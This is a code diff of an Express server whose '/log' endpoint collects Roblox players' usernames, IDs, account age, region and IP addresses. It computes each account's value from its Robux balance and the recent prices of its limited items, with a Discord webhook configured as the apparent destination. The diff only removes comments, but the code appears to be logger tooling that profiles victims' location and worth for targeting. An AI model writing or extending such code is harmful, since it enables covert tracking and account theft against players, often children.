@@ -5,19 +5,14 @@ const app = express();
 
 app.use(express.json());
 app.use(cors());
-app.set('trust proxy', true); // Necesario para obtener la IP real en Render/Heroku
+app.set('trust proxy', true);
 
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
-
-// 🧮 FUNCIÓN PARA CALCULAR EL VALOR DE LA CUENTA
 async function getAccountValue(userId) {
     try {
-        // 1. Obtener Robux
         const robuxRes = await axios.get(`https://economy.roblox.com/v2/users/${userId}/currency`);
         const robux = robuxRes.data.robux || 0;
 
-        // 2. Obtener RAP (Valor de objetos limitados)
-        // Buscamos los primeros 100 objetos para no saturar la API y hacer el proceso rápido.
         let rap = 0;
         try {
             const rapRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/inventory/collectibles?limit=100&sortOrder=Desc`);
@@ -25,13 +20,11 @@ async function getAccountValue(userId) {
                 rap = rapRes.data.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
             }
         } catch (e) {
-            // Si el usuario tiene el inventario privado, fallará aquí y el RAP será 0.
             console.log("Inventario privado o error al obtener RAP.");
         }
 
         const total = robux + rap;
-        
-        // Formatear números con comas (ej: 1000 -> 1,000)
+
         return {
             robux: robux.toLocaleString('en-US'),
             rap: rap.toLocaleString('en-US'),
@@ -47,10 +40,8 @@ app.post('/log', async (req, res) => {
     try {
         const { username, displayName, userId, gameId, accountAge, region } = req.body;
         
-        // 🌐 Capturar IP
         const clientIP = req.ip || req.connection.remoteAddress || 'N/A';
 
-        // 💰 Calcular Account Value (esto puede tardar 1-2 segundos)
         const accountValue = await getAccountValue(userId);
 
         const payload = {
